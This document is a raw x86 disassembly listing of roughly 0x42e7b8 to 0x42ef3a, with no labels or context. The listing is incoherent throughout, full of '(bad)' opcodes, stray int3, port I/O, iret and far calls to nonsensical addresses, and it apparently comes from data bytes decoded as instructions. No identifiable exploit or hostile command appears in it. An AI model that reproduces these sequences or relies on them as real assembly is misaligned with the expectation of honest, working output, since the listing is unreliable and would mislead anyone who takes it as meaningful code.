  42e7b8:	cmp    edi,0xffffffff
  42e7bb:	add    al,0xad
  42e7bd:	call   esp
  42e7bf:	jo     0x42e744
  42e7c1:	cmp    edi,0x11
  42e7c4:	mov    edi,?
  42e7c6:	mov    ds:0xffff00e4,al
  42e7cb:	push   eax
  42e7cc:	mov    bh,bh
  42e7ce:	xchg   BYTE PTR ds:0x2fff00ff,dl
  42e7d4:	ja     0x42e7a2
  42e7d6:	add    ecx,eax
  42e7d8:	add    BYTE PTR [ebx-0x18ec01],al
  42e7de:	jns    0x42e794
  42e7e0:	cmp    edi,0xffffffcc
  42e7e3:	sahf   
  42e7e4:	cmp    al,BYTE PTR [eax]
  42e7e6:	and    BYTE PTR [ebx+0x61cc0000],ah
  42e7ec:	int3   
  42e7ed:	inc    esi
  42e7ef:	out    0xff,al
  42e7f1:	add    DWORD PTR [ebx-0x7effbb3a],0xffffff9b
  42e7f8:	(bad)  
  42e7f9:	(bad)  
  42e7fa:	(bad)  
  42e7fb:	cmp    BYTE PTR [ebx-0x1],cl
  42e7fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e7ff:	imul   eax,DWORD PTR [eax],0xffffffff
  42e802:	add    BYTE PTR [eax],al
  42e804:	inc    ecx
  42e805:	call   DWORD PTR ds:0xffcc37
  42e80b:	jb     0x42e84c
  42e80d:	push   DWORD PTR [edi+0x50]
  42e810:	add    bh,bh
  42e812:	dec    DWORD PTR [ecx+0x79]
  42e815:	mov    DWORD PTR [edi-0x2a],eax
  42e818:	inc    DWORD PTR [eax]
  42e81a:	call   FWORD PTR ds:0x4b9c006f
  42e820:	(bad)  
  42e821:	(bad)  
  42e822:	(bad)  
  42e823:	fchs   
  42e825:	mov    DWORD PTR [ecx],esp
  42e827:	(bad)  
  42e828:	(bad)  
  42e829:	inc    DWORD PTR [eax]
  42e82b:	out    dx,al
  42e82c:	xchg   ecx,eax
  42e82d:	xor    DWORD PTR [ebx+ebp*8],0xffffffff
  42e831:	int3   
  42e832:	add    BYTE PTR [edx-0x6cfefff3],dh
  42e838:	add    bh,bh
  42e83a:	mov    DWORD PTR [esi-0x2],ecx
  42e83d:	mov    DWORD PTR [esi-0x64],ebp
  42e840:	add    BYTE PTR [ebx-0x6f2601],al
  42e846:	push   eax
  42e847:	out    dx,al
  42e848:	dec    esp
  42e84a:	call   FWORD PTR ds:0x1c7500ac
  42e850:	add    bh,bh
  42e852:	dec    ebp
  42e854:	add    BYTE PTR [ebx+0x831ce7],0x0
  42e85b:	and    eax,0x88f7ffb5
  42e860:	mov    edi,edi
  42e862:	sbb    edi,0x59
  42e865:	or     DWORD PTR [esi],0x1
  42e868:	inc    DWORD PTR [eax]
  42e86a:	call   DWORD PTR [edx+0x57138900]
  42e870:	inc    DWORD PTR [eax]
  42e872:	push   DWORD PTR [esi]
  42e874:	lods   al,BYTE PTR ds:[esi]
  42e875:	call   FWORD PTR [ebx]
  42e877:	mov    edi,edi
  42e879:	inc    DWORD PTR [ebx-0x73ff6063]
  42e87f:	push   es
  42e880:	add    DWORD PTR [eax],0xffffffff
  42e883:	inc    ebp
  42e884:	xor    al,0x89
  42e886:	adc    ecx,DWORD PTR [ebp+0x43cc00ff]
  42e88c:	popa   
  42e88d:	add    BYTE PTR [ebx],dh
  42e88f:	mov    dh,0x0
  42e891:	mov    edi,edi
  42e893:	iret   
  42e894:	add    edi,edi
  42e896:	(bad)  
  42e897:	ror    BYTE PTR [ecx+0x394000ff],0xff
  42e89e:	push   ecx
  42e89f:	stos   DWORD PTR es:[edi],eax
  42e8a0:	(bad)  
  42e8a1:	(bad)  
  42e8a2:	push   DWORD PTR [edx-0x4a]
  42e8a5:	call   DWORD PTR [esi-0x78]
  42e8a8:	add    BYTE PTR [eax],al
  42e8aa:	add    BYTE PTR [ebx+0x7f],ch
  42e8ad:	xor    DWORD PTR [ebx],0x73
  42e8b0:	(bad)  
  42e8b1:	(bad)  
  42e8b2:	dec    DWORD PTR [ebx]
  42e8b4:	scas   al,BYTE PTR es:[edi]
  42e8b5:	add    BYTE PTR [edx],cl
  42e8b7:	mov    bh,0xff
  42e8b9:	inc    DWORD PTR [eax]
  42e8bb:	iret   
  42e8bc:	and    DWORD PTR [eax],eax
  42e8be:	pusha  
  42e8bf:	lds    ecx,FWORD PTR [ecx-0x6dd13301]
  42e8c5:	dec    DWORD PTR [esi+0x6f]
  42e8c8:	inc    DWORD PTR [eax]
  42e8ca:	inc    ebp
  42e8cc:	add    eax,DWORD PTR [ebx-0x330334]
  42e8d2:	dec    edx
  42e8d4:	add    eax,0x45b5ff
  42e8d9:	add    bh,bh
  42e8db:	sahf   
  42e8dc:	add    bh,bh
  42e8de:	and    BYTE PTR ds:0x6e83ff83,al
  42e8e4:	xchg   ecx,eax
  42e8e5:	(bad)  
  42e8e6:	ficomp WORD PTR [esi-0x2e003400]
  42e8ec:	mov    dh,0x89
  42e8ee:	push   0xa
  42e8f0:	mov    edi,edi
  42e8f2:	add    BYTE PTR [ebx+0x68],ah
  42e8f5:	sbb    DWORD PTR [edx-0x7cffa4],0xffffff88
  42e8fc:	ret    0xf3ff
  42e8ff:	push   edi
  42e900:	add    DWORD PTR [eax],0xffffff89
  42e903:	sahf   
  42e904:	sar    edi,cl
  42e906:	fistp  QWORD PTR [edi+0x10ffcc89]
  42e90c:	sar    bh,1
  42e90e:	in     al,dx
  42e90f:	mov    bl,0xff
  42e911:	inc    DWORD PTR [ebx+0x6ccc8f7c]
  42e917:	and    edi,edi
  42e919:	add    ah,cl
  42e91b:	call   0x0:0x1e3fff7b
  42e922:	sbb    ebp,0xffffffb2
  42e925:	cmp    edx,0xffffffbf
  42e928:	inc    DWORD PTR [eax]
  42e92a:	adc    DWORD PTR [esi+0x376cffe5],0x0
  42e931:	add    DWORD PTR [eax],0xffffffea
  42e934:	dec    ebx
  42e935:	dec    DWORD PTR [ebp-0x56]
  42e93b:	and    ebx,DWORD PTR [eax+eax*1+0x18]
  42e93f:	cmp    eax,0xb40083ff
  42e944:	lea    eax,[eax]
  42e946:	in     al,dx
  42e947:	dec    edi
  42e948:	(bad)  
  42e949:	inc    DWORD PTR [ebx+0x1eff2695]
  42e94f:	pop    ecx
  42e950:	cmp    edi,0x0
  42e953:	pop    ebp
  42e954:	lods   al,BYTE PTR ds:[esi]
  42e955:	add    dl,bh
  42e957:	or     al,0xff
  42e959:	(bad)  
  42e95a:	(bad)  
  42e95b:	jnp    0x42e984
  42e95d:	add    BYTE PTR [ecx+0x890089],cl
  42e963:	and    dh,BYTE PTR [ebp-0x1]
  42e966:	retf   0xff0c
  42e969:	(bad)  
  42e96a:	call   FWORD PTR [eax-0x3f]
  42e96d:	add    BYTE PTR [esp+edx*4-0x1],dl
  42e971:	inc    DWORD PTR [eax]
  42e973:	ss mov cs,esp
  42e976:	inc    edx
  42e977:	scas   al,BYTE PTR es:[edi]
  42e978:	(bad)  
  42e979:	(bad)  
  42e97a:	jmp    FWORD PTR [esi]
  42e97c:	jo     0x42e97d
  42e97e:	or     eax,0xffffff4a
  42e983:	inc    ebx
  42e984:	mov    dh,0x0
  42e986:	inc    BYTE PTR [edi]
  42e988:	add    bh,bh
  42e98a:	inc    DWORD PTR [edi+0x3d4d8965]
  42e990:	inc    DWORD PTR [eax]
  42e992:	add    BYTE PTR [esi],bh
  42e994:	inc    esp
  42e995:	call   DWORD PTR [edx-0x7cffff2d]
  42e99b:	in     eax,dx
  42e99c:	pop    esi
  42e99d:	xor    DWORD PTR [esi-0x3333ff43],0xffffff8e
  42e9a4:	mov    ebx,0xff2afcff
  42e9a9:	int3   
  42e9aa:	dec    DWORD PTR [ebp-0x48]
  42e9ad:	dec    DWORD PTR [edi-0x22]
  42e9b0:	add    BYTE PTR [ecx-0x1eee77],cl
  42e9b6:	pop    ss
  42e9b7:	clc    
  42e9b8:	dec    DWORD PTR [ecx+0x919800]
  42e9be:	rcr    DWORD PTR [ebx],cl
  42e9c0:	(bad)  
  42e9c1:	inc    DWORD PTR [ebx-0x3d76e449]
  42e9c7:	pop    edx
  42e9c8:	add    BYTE PTR [ebx+0xfbf2ff],al
  42e9ce:	ds xchg esp,eax
  42e9d0:	dec    DWORD PTR [ecx-0xff2201]
  42e9d6:	push   es
  42e9d7:	push   0x90ffff83
  42e9dc:	fld    QWORD PTR [eax]
  42e9de:	push   esi
  42e9df:	add    eax,DWORD PTR [eax]
  42e9e1:	dec    DWORD PTR [ecx-0x35ff9162]
  42e9e7:	icebp  
  42e9e8:	inc    DWORD PTR [eax]
  42e9ea:	add    bh,bh
  42e9ec:	cld    
  42e9ed:	add    DWORD PTR [edi+0x838347],0xffffffa9
  42e9f4:	daa    
  42e9f5:	add    BYTE PTR [eax],cl
  42e9f7:	(bad)  
  42e9fa:	xor    DWORD PTR ds:0xcf86ff87,0x0
  42ea01:	inc    DWORD PTR [eax]
  42ea03:	jg     0x42e9fb
  42ea05:	jmp    DWORD PTR [ebx+0x17]
  42ea0b:	jno    0x42ea5f
  42ea0d:	add    dh,dh
  42ea0f:	push   ss
  42ea10:	add    BYTE PTR [eax],al
  42ea12:	adc    DWORD PTR [esi+0x1e96cc85],0xffffff83
  42ea19:	int3   
  42ea1a:	jmp    DWORD PTR [esi]
  42ea1c:	dec    eax
  42ea1d:	call   DWORD PTR [edx+0x4b]
  42ea20:	(bad)  
  42ea21:	(bad)  
  42ea22:	dec    DWORD PTR [eax]
  42ea24:	push   0x835b07ff
  42ea29:	add    BYTE PTR [ecx-0x67ff4ab1],cl
  42ea2f:	xchg   edi,eax
  42ea30:	cmp    edi,0xffffff89
  42ea33:	mov    al,ds:0x56f2ff56
  42ea38:	mov    DWORD PTR [ebx-0xf5927d],eax
  42ea3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ea3f:	or     esp,0xffffff89
  42ea42:	add    BYTE PTR [esi+0x79],al
  42ea45:	jmp    esp
  42ea47:	and    al,0xff
  42ea49:	add    BYTE PTR [eax],al
  42ea4b:	sbb    al,0xc4
  42ea4d:	push   DWORD PTR [esi-0xd]
  42ea50:	add    BYTE PTR [ebx-0xb3b27d],al
  42ea56:	inc    esp
  42ea57:	pop    ecx
  42ea58:	add    BYTE PTR [eax],al
  42ea5a:	add    BYTE PTR [eax+0x45],ah
  42ea5d:	mov    DWORD PTR [esp+eiz*8+0x0],edx
  42ea61:	add    ah,cl
  42ea63:	sub    BYTE PTR [esi-0x1],dl
  42ea66:	pop    esp
  42ea67:	pop    esi
  42ea68:	mov    DWORD PTR [ebx-0x707101],eax
  42ea6e:	shl    BYTE PTR [edi],cl
  42ea70:	add    BYTE PTR [eax],al
  42ea72:	or     DWORD PTR [ebx-0x1002ffb2],0xffffffff
  42ea79:	add    BYTE PTR [eax],al
  42ea7b:	xor    BYTE PTR [edx-0x764f2301],ch
  42ea81:	add    ah,cl
  42ea83:	clc    
  42ea84:	popf   
  42ea85:	add    ch,ch
  42ea87:	std    
  42ea88:	int3   
  42ea89:	(bad)  
  42ea8a:	jmp    ecx
  42ea8c:	or     ah,0xc9
  42ea8f:	sbb    al,0xff
  42ea91:	add    BYTE PTR [ecx-0x34000f67],cl
  42ea97:	xchg   BYTE PTR [ebx-0x5addff01],al
  42ea9d:	cmp    DWORD PTR [ecx+esi*1-0x5e000001],0xffffff90
  42eaa5:	add    BYTE PTR [esi+0xffd2],bl
  42eaab:	not    DWORD PTR [edi]
  42eaad:	inc    DWORD PTR [esi]
  42eaaf:	pop    ecx
  42eab0:	(bad)  
  42eab1:	(bad)  
  42eab2:	call   FWORD PTR [ebx+edi*2]
  42eab5:	mov    DWORD PTR [edx-0x7c00ff4c],esi
  42eabb:	lea    esi,[ebx+eax*4+0x38]
  42eabf:	add    al,0xff
  42eac1:	inc    DWORD PTR [eax]
  42eac3:	fild   WORD PTR [ebx-0x1]
  42eac6:	jb     0x42eaee
  42eac8:	inc    DWORD PTR [eax]
  42eaca:	add    cl,al
  42eacc:	sbb    edi,edi
  42eace:	fsubr  st(7),st
  42ead0:	inc    DWORD PTR [eax]
  42ead2:	int3   
  42ead3:	dec    esp
  42ead4:	xchg   esp,eax
  42ead5:	(bad)  
  42ead6:	cmp    eax,0xffff83da
  42eadb:	(bad)  
  42eadc:	addr16 add dl,ah
  42eadf:	mov    eax,0x3b00ffff
  42eae4:	xchg   ah,cl
  42eae6:	inc    ebx
  42eae7:	xor    bh,bh
  42eae9:	add    BYTE PTR [ecx-0x3dffeb74],cl
  42eaef:	mov    ebp,0x3b83ff83
  42eaf4:	sar    edi,1
  42eaf6:	hlt    
  42eaf7:	popa   
  42eaf8:	inc    DWORD PTR [ebx-0x9ff67d]
  42eafe:	fmul   DWORD PTR [ebx]
  42eb00:	add    BYTE PTR [eax],al
  42eb02:	and    esp,0xffffffc0
  42eb05:	call   DWORD PTR [ecx+ebx*4]
  42eb08:	(bad)  
  42eb09:	(bad)  
  42eb0a:	(bad)  
  42eb0b:	jge    0x42eb13
  42eb0d:	int3   
  42eb0e:	add    BYTE PTR [ebx-0x2c00ff01],dh
  42eb14:	jns    0x42eb15
  42eb16:	sub    al,0x77
  42eb18:	inc    DWORD PTR [eax]
  42eb1a:	call   edi
  42eb1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eb1d:	mov    esi,edi
  42eb1f:	xchg   esi,eax
  42eb20:	add    DWORD PTR [ebx-0x625600],0xfffffff8
  42eb27:	push   esp
  42eb28:	(bad)  
  42eb29:	(bad)  
  42eb2a:	inc    DWORD PTR [esi]
  42eb2c:	out    dx,al
  42eb2d:	call   DWORD PTR [edi]
  42eb2f:	mov    ebp,0x63ffff89
  42eb34:	add    DWORD PTR [ebx+0x83ea69],eax
  42eb3a:	push   DWORD PTR [ecx]
  42eb3c:	nop
  42eb3d:	(bad)  
  42eb3e:	jge    0x42eb8f
  42eb40:	inc    DWORD PTR [eax]
  42eb42:	add    bl,dh
  42eb44:	mov    eax,ds:0x8333fbff
  42eb49:	(bad)  
  42eb4a:	inc    ecx
  42eb4c:	mov    ds:0xffee7289,eax
  42eb51:	inc    DWORD PTR [eax]
  42eb53:	pop    ds
  42eb54:	das    
  42eb55:	call   FWORD PTR ds:0x83cc00d4
  42eb5b:	fwait
  42eb5c:	scas   eax,DWORD PTR es:[edi]
  42eb5d:	jmp    edi
  42eb5f:	ins    BYTE PTR es:[edi],dx
  42eb60:	inc    DWORD PTR [eax]
  42eb62:	add    BYTE PTR [edx+eiz*1+0x0],cl
  42eb66:	shr    DWORD PTR [edi],1
  42eb68:	cmp    edi,0x0
  42eb6b:	xor    esp,DWORD PTR [ebx]
  42eb6d:	int3   
  42eb6e:	repnz adc edi,edi
  42eb71:	cmp    edi,0x4a
  42eb74:	loop   0x42eb75
  42eb76:	sbb    ch,BYTE PTR [edi-0x77]
  42eb79:	int3   
  42eb7a:	add    dl,ah
  42eb7c:	jmp    0x42eb4a
  42eb7e:	and    eax,0xffffcc78
  42eb83:	mov    edx,DWORD PTR [edi+edi*8-0x7600a630]
  42eb8a:	int3   
  42eb8b:	mov    ebp,0xd325ffba
  42eb90:	add    DWORD PTR [eax],0xffffffff
  42eb93:	mov    bl,0x64
  42eb95:	add    al,cl
  42eb97:	daa    
  42eb98:	add    bh,bh
  42eb9a:	call   DWORD PTR [ecx]
  42eb9c:	fwait
  42eb9d:	int3   
  42eb9e:	push   ebx
  42eb9f:	dec    ebx
  42eba0:	add    BYTE PTR [ecx+0x351900],cl
  42eba6:	cs popa 
  42eba8:	int3   
  42eba9:	cmp    edi,0xffffffd9
  42ebac:	push   edi
  42ebad:	int3   
  42ebae:	inc    edi
  42ebaf:	arpl   WORD PTR [eax],ax
  42ebb1:	add    BYTE PTR [ebx+0x100ac3c],al
  42ebb7:	sbb    al,BYTE PTR [eax]
  42ebb9:	add    bh,bh
  42ebbb:	enter  0x71,0x3e
  42ebbf:	mov    es,WORD PTR [ebx-0x70970000]
  42ebc5:	push   esi
  42ebc7:	adc    bh,bh
  42ebc9:	(bad)  
  42ebca:	(bad)  
  42ebcb:	cmp    DWORD PTR [ebx],esi
  42ebcd:	call   DWORD PTR [esi+eax*2]
  42ebd0:	inc    DWORD PTR [ebx-0x33ab777d]
  42ebd6:	jmp    0x9809:0xff00cce5
  42ebdd:	add    DWORD PTR [ebx-0x7c00d6],0x44
  42ebe4:	lock add BYTE PTR [ecx],dh
  42ebe7:	pusha  
  42ebe8:	mov    DWORD PTR [eax],eax
  42ebea:	add    cl,dh
  42ebec:	mov    bl,0xff
  42ebee:	jl     0x42ec12
  42ebf0:	dec    esp
  42ebf2:	add    BYTE PTR [esi-0x69520064],dh
  42ebf8:	dec    DWORD PTR [ecx+0xf7ba89]
  42ebfe:	inc    esi
  42ebff:	mov    eax,ds:0x71cc00ff
  42ec04:	xchg   edx,eax
  42ec05:	adc    DWORD PTR [edi+0x8300fe],0xffffffa9
  42ec0c:	mov    dl,0x0
  42ec0e:	mov    WORD PTR [edi+edi*8],gs
  42ec11:	add    BYTE PTR [eax],al
  42ec13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec14:	call   0xff58ba18
  42ec19:	(bad)  
  42ec1a:	push   DWORD PTR [ecx]
  42ec1c:	test   DWORD PTR [eax],eax
  42ec1e:	in     al,0x50
  42ec20:	mov    edi,edi
  42ec22:	inc    DWORD PTR [ebp+0x450affa8]
  42ec28:	dec    esp
  42ec2a:	adc    DWORD PTR [edx],0x3b
  42ec2d:	int3   
  42ec2e:	push   ebp
  42ec2f:	push   0x9cffffff
  42ec34:	sub    al,0x89
  42ec36:	stc    
  42ec37:	out    0x89,al
  42ec39:	inc    DWORD PTR [eax]
  42ec3b:	retf   0xcc77
  42ec3e:	pushf  
  42ec3f:	ins    BYTE PTR es:[edi],dx
  42ec40:	inc    DWORD PTR [eax]
  42ec42:	or     DWORD PTR [edi],0x6d
  42ec45:	add    BYTE PTR [edx+edx*8],bh
  42ec48:	(bad)  
  42ec49:	(bad)  
  42ec4a:	inc    DWORD PTR [ebp-0x35]
  42ec4d:	(bad)  
  42ec4e:	cli    
  42ec4f:	fmul   st,st(4)
  42ec51:	int3   
  42ec52:	add    BYTE PTR [ebx],ah
  42ec54:	call   0xff606659
  42ec59:	cmp    edi,0x10
  42ec5c:	mov    ah,0x0
  42ec5e:	popa   
  42ec5f:	jae    0x42ec60
  42ec61:	add    ah,cl
  42ec63:	or     eax,0xc14ff2b
  42ec68:	int3   
  42ec69:	cmp    edi,0xffffffbb
  42ec6c:	cmp    eax,0xff2f02ff
  42ec71:	add    bh,bh
  42ec73:	inc    edx
  42ec74:	dec    ebx
  42ec75:	add    ch,bl
  42ec77:	add    BYTE PTR [eax],0x0
  42ec7a:	or     DWORD PTR [ebx],0xffffff9d
  42ec7d:	int3   
  42ec7e:	scas   eax,DWORD PTR es:[edi]
  42ec7f:	jmp    0x8923:0x6c89ff00
  42ec86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec87:	js     0x42ec89
  42ec89:	add    BYTE PTR [ecx-0x1005266],cl
  42ec8f:	fiadd  DWORD PTR [eax]
  42ec91:	(bad)  
  42ec92:	jmp    FWORD PTR [edi-0x29]
  42ec95:	push   DWORD PTR [ecx-0x63]
  42ec98:	add    BYTE PTR [eax],al
  42ec9a:	call   FWORD PTR [edi+0x7b8800af]
  42eca0:	int3   
  42eca1:	add    BYTE PTR [eax],al
  42eca3:	sub    ah,BYTE PTR [esi]
  42eca5:	call   DWORD PTR [edx-0x7cff58]
  42ecab:	xor    BYTE PTR [ebx+eax*4+0x838c85],ch
  42ecb2:	add    bh,ch
  42ecb4:	inc    ebp
  42ecb5:	int3   
  42ecb6:	stos   BYTE PTR es:[edi],al
  42ecb7:	retf   
  42ecb8:	inc    DWORD PTR [eax]
  42ecba:	jmp    FWORD PTR [ecx]
  42ecbc:	test   BYTE PTR [eax],al
  42ecbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ecbf:	cmp    eax,0x6a0000ff
  42ecc4:	das    
  42ecc5:	jmp    ecx
  42ecc7:	(bad)  
  42ecc8:	add    bh,bh
  42ecca:	add    dl,bl
  42eccc:	scas   al,BYTE PTR es:[edi]
  42eccd:	jmp    FWORD PTR [ebp+0x7f]
  42ecd0:	(bad)  
  42ecd1:	(bad)  
  42ecd2:	jmp    FWORD PTR [ecx+0x39a48976]
  42ecd8:	add    BYTE PTR [ecx+0x6aed00],cl
  42ecde:	mov    bl,0xb
  42ece0:	dec    esp
  42ece2:	xor    DWORD PTR [eax+0x9],0x0
  42ece6:	shr    DWORD PTR [ebp-0x2900ff7d],cl
  42ecec:	mov    al,0x83
  42ecee:	retf   
  42ecef:	icebp  
  42ecf0:	inc    DWORD PTR [eax]
  42ecf2:	add    BYTE PTR [ebx+0x40120051],ah
  42ecf8:	dec    DWORD PTR [ecx-0x902d00]
  42ecfe:	or     al,0x89
  42ed01:	inc    DWORD PTR [eax]
  42ed03:	mov    WORD PTR [ebp-0x711a00],es
  42ed09:	add    ah,cl
  42ed0b:	shl    BYTE PTR [ebp-0xcb2501],1
  42ed11:	int3   
  42ed12:	mov    DWORD PTR [edx],ebp
  42ed14:	aaa    
  42ed15:	mov    DWORD PTR [edi],edx
  42ed17:	xchg   ebx,eax
  42ed18:	int3   
  42ed19:	(bad)  
  42ed1a:	push   DWORD PTR [esi-0x436b00c6]
  42ed20:	add    BYTE PTR [ecx+0x2519cc],cl
  42ed26:	es cdq 
  42ed28:	(bad)  
  42ed29:	inc    DWORD PTR [eax]
  42ed2b:	out    dx,eax
  42ed2c:	in     al,dx
  42ed2d:	call   DWORD PTR [esi]
  42ed2f:	add    al,BYTE PTR [eax]
  42ed31:	add    bh,bh
  42ed33:	int    0x32
  42ed35:	add    BYTE PTR [ebp-0x12],dl
  42ed38:	dec    esp
  42ed3a:	dec    edi
  42ed3c:	aad    0xff
  42ed3e:	mul    BYTE PTR [edi+edi*8]
  42ed41:	add    BYTE PTR [ebx+0xd008c08],al
  42ed47:	cmp    al,0x0
  42ed49:	dec    esp
  42ed4b:	out    0x3b,eax
  42ed4d:	(bad)  
  42ed4e:	stc    
  42ed4f:	pop    esi
  42ed50:	add    BYTE PTR [eax],al
  42ed52:	(bad)  
  42ed53:	mov    edx,0x7cc1ff68
  42ed58:	int3   
  42ed59:	add    bh,bh
  42ed5b:	jo     0x42edc2
  42ed5d:	inc    DWORD PTR [ecx+0xfffff7]
  42ed63:	xchg   BYTE PTR [eax+eax*1-0x15],ch
  42ed67:	fiadd  WORD PTR [ebx+0x4712ffff]
  42ed6d:	add    BYTE PTR [ecx],dh
  42ed6f:	rol    BYTE PTR [eax],0xff
  42ed72:	call   FWORD PTR [ebx]
  42ed74:	push   esi
  42ed75:	push   DWORD PTR [ebx+0x1f]
  42ed78:	inc    DWORD PTR [ebx+0x1712ff]
  42ed7e:	xchg   ebx,eax
  42ed7f:	mov    al,ds:0x340000ff
  42ed84:	ud0    ebx,ebp
  42ed87:	add    WORD PTR [eax],0xffcc
  42ed8b:	push   ss
  42ed8c:	jecxz  0x42ed8e
  42ed8e:	(bad)  
  42ed8f:	iret   
  42ed90:	add    bh,bh
  42ed92:	inc    DWORD PTR [ecx+0x43]
  42ed95:	dec    DWORD PTR [ebp+0x54]
  42ed98:	(bad)  
  42ed99:	inc    DWORD PTR [eax]
  42ed9b:	lods   al,BYTE PTR ds:[esi]
  42ed9c:	test   DWORD PTR [ebx-0xce8f],0xff63b500
  42eda6:	mov    al,ds:0xff00e9
  42edab:	mov    ebx,0xb48f0019
  42edb0:	add    bh,bh
  42edb2:	jmp    edi
  42edb4:	(bad)  
  42edb5:	inc    DWORD PTR [ebx+0xff0065]
  42edbb:	or     al,0xbb
  42edbd:	add    BYTE PTR [ebx-0x7c00762e],dl
  42edc3:	push   edi
  42edc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42edc5:	add    BYTE PTR [edx-0x77],bl
  42edc8:	inc    DWORD PTR [eax]
  42edca:	(bad)  
  42edcb:	mov    edx,0x86230063
  42edd0:	add    bh,bh
  42edd2:	int3   
  42edd3:	ds (bad) 
  42edd5:	(bad)  
  42edd6:	sti    
  42edd7:	mov    edi,edi
  42edd9:	add    BYTE PTR [eax],al
  42eddb:	nop
  42eddc:	push   esp
  42eddd:	add    BYTE PTR [edi+eax*8],ah
  42ede0:	add    bh,bh
  42ede2:	mov    eax,edx
  42ede4:	inc    esi
  42ede5:	add    BYTE PTR [ebx-0x7600fff2],bl
  42edeb:	ret    
  42edec:	call   0xff89:0xff699000
  42edf3:	cli    
  42edf4:	sar    edi,1
  42edf6:	cmp    DWORD PTR [edi],ebp
  42edf8:	add    bh,bh
  42edfa:	(bad)  
  42edfb:	jl     0x42edb5
  42edfd:	int3   
  42edfe:	xchg   ecx,eax
  42edff:	inc    ecx
  42ee00:	inc    DWORD PTR [eax]
  42ee02:	add    BYTE PTR [eax-0x62],bl
  42ee05:	int3   
  42ee06:	fiadd  WORD PTR [edi+0x29ffff83]
  42ee0c:	bound  eax,QWORD PTR [eax]
  42ee0e:	jp     0x42ee2d
  42ee10:	inc    DWORD PTR [eax]
  42ee12:	(bad)  
  42ee13:	fbstp  TBYTE PTR [esi+0xdc3aff]
  42ee19:	(bad)  
  42ee1a:	push   edi
  42ee1c:	inc    ebp
  42ee1d:	add    BYTE PTR ds:0xffff74,ah
  42ee23:	in     al,dx
  42ee24:	bound  eax,QWORD PTR [eax]
  42ee26:	fs aaa 
  42ee28:	int3   
  42ee29:	add    BYTE PTR [eax],al
  42ee2b:	cmp    eax,0xffffffff
  42ee2e:	mov    edx,DWORD PTR [ebx+eax*4+0xa0ecc83]
  42ee35:	call   edi
  42ee37:	call   0x35:0x7483ff89
  42ee3e:	xchg   esi,eax
  42ee3f:	aam    0xff
  42ee41:	add    BYTE PTR [ecx-0x707c8044],cl
  42ee47:	call   0x750eee4c
  42ee4c:	fwait
  42ee4d:	sub    DWORD PTR [edx-0x7c7c3379],0xffffffbd
  42ee54:	inc    ebx
  42ee55:	sub    DWORD PTR [edx+0x28],0x0
  42ee59:	add    bh,bh
  42ee5b:	xor    DWORD PTR [eax],eax
  42ee5d:	push   DWORD PTR [edx-0x5b]
  42ee60:	(bad)  
  42ee61:	inc    DWORD PTR [eax]
  42ee63:	stos   BYTE PTR es:[edi],al
  42ee64:	mov    bh,bh
  42ee66:	mov    ebx,0x48
  42ee6b:	pop    ds
  42ee6c:	mov    al,ds:0x894457ff
  42ee71:	cmp    edi,0x50
  42ee74:	push   esi
  42ee75:	int3   
  42ee76:	es in  eax,dx
  42ee78:	(bad)  
  42ee79:	inc    DWORD PTR [eax]
  42ee7b:	jle    0x42ee7b
  42ee7d:	add    DWORD PTR [edx],0x9
  42ee80:	add    DWORD PTR [eax],0xffffffff
  42ee83:	xchg   ecx,eax
  42ee84:	dec    DWORD PTR [ecx-0x7aa4]
  42ee8a:	add    BYTE PTR [edx],ah
  42ee8c:	push   esp
  42ee8d:	dec    esp
  42ee8f:	add    eax,0x8fffffff
  42ee94:	cmp    BYTE PTR [eax],al
  42ee96:	xor    DWORD PTR [ecx+0x0],ecx
  42ee99:	inc    DWORD PTR [eax]
  42ee9b:	cmp    dl,BYTE PTR [ecx]
  42ee9d:	add    bh,ah
  42ee9f:	mov    cl,0x83
  42eea1:	add    DWORD PTR [ebx-0x2800dfe8],0xffffff8d
  42eea8:	add    DWORD PTR [eax],0xffffffff
  42eeab:	in     al,0x97
  42eead:	cmp    DWORD PTR [ecx+0x60],0xffffff83
  42eeb1:	cmp    edi,0xffffffdf
  42eeb4:	jmp    0xff5c86b8
  42eeb9:	add    bh,bh
  42eebb:	ins    BYTE PTR es:[edi],dx
  42eebc:	xchg   DWORD PTR [eax],eax
  42eebe:	mov    ds,edx
  42eec0:	dec    esp
  42eec2:	add    ah,al
  42eec4:	sbb    eax,0x894a0ccc
  42eec9:	inc    DWORD PTR [eax]
  42eecb:	sbb    esp,esi
  42eecd:	adc    DWORD PTR [ebp-0x7c00001b],0x73
  42eed4:	popa   
  42eed5:	sbb    eax,0xffffffd9
  42eed8:	(bad)  
  42eed9:	(bad)  
  42eeda:	dec    DWORD PTR [edx-0x12]
  42eedd:	call   FWORD PTR [ebx-0x5d]
  42eee0:	or     esp,0xffffff89
  42eee3:	adc    ch,BYTE PTR [edi]
  42eee5:	inc    esi
  42eee7:	add    al,0xff
  42eee9:	(bad)  
  42eeea:	(bad)  
  42eeeb:	jmp    0x42ef43
  42eeed:	call   ecx
  42eeef:	xchg   ebp,eax
  42eef0:	inc    DWORD PTR [eax]
  42eef2:	(bad)  
  42eef3:	js     0x42ef41
  42eef5:	call   FWORD PTR [eax+0x2c]
  42eef8:	dec    DWORD PTR [ecx-0xc53000]
  42eefe:	add    al,0x3a
  42ef00:	int3   
  42ef01:	int3   
  42ef02:	add    BYTE PTR [esi],dh
  42ef04:	hlt    
  42ef05:	add    BYTE PTR [edx+0x65],bl
  42ef08:	cmp    edi,0x0
  42ef0b:	sbb    al,0x13
  42ef0d:	xor    DWORD PTR [eax],0xfffffffc
  42ef10:	cmp    edi,0x0
  42ef13:	test   BYTE PTR [ebp-0x1],bl
  42ef16:	retf   
  42ef17:	sub    bh,bh
  42ef19:	(bad)  
  42ef1a:	dec    DWORD PTR [edx+ebx*1+0x958b00]
  42ef21:	dec    DWORD PTR [ecx-0x2400ed90]
  42ef27:	enter  0x83ff,0x0
  42ef2b:	push   0x14
  42ef2d:	call   FWORD PTR [ebx-0x7c000070]
  42ef33:	call   FWORD PTR [ebx-0x1]
  42ef36:	inc    ebx
  42ef37:	clc    
  42ef38:	add    BYTE PTR [eax],al
  42ef3a:	and    DWORD PTR [ecx+0x753f0056],0xffffffff
